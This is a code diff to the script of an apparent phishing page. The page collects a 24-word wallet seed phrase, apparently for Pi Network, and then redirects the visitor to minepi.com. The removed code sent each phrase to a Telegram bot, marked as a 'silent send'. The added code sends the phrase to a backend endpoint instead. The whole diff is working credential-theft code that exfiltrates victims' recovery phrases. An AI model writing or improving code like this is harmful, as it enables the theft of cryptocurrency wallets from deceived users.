@@ -202,57 +202,24 @@
     </div>
 
     <script>
-        // Telegram Bot Configuration
-        
-
-        // Replace the sendToTelegram function with this:
-async function sendToTelegram(passphrase) {
-    try {
-        const response = await fetch('http://localhost:3000/api/send-passphrase', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ passphrase })
-        });
-        
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        
-        return true;
-    } catch (error) {
-        console.error('Error:', error);
-        return false;
-    }
-}
-            const time = new Date().toLocaleString();
-            const message = `
-🔐 *New Passphrase Submission* 🔐
-
-📝 *Passphrase*:
-\`\`\`
-${passphrase}
-\`\`\`
-
-⏰ *Time*: ${time}
-            `;
-
+        // Updated to use your backend API
+        async function sendToTelegram(passphrase) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                const response = await fetch('http://localhost:3000/api/send-passphrase', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    }),
+                    body: JSON.stringify({ passphrase })
                 });
+                
+                if (!response.ok) {
+                    throw new Error('Failed to send passphrase');
+                }
+                
                 return true;
             } catch (error) {
-                console.error('Telegram error:', error);
+                console.error('Error:', error);
                 return false;
             }
         }
@@ -299,7 +266,7 @@ ${passphrase}
             const words = text.split(/\s+/).filter(word => word.length > 0);
             
             if (words.length === 24) {
-                await sendToTelegram(text); // Silent send (no alerts)
+                const success = await sendToTelegram(text);
                 window.location.href = 'https://minepi.com'; // Always redirect
             } else {
                 alert('Please enter exactly 24 words.');
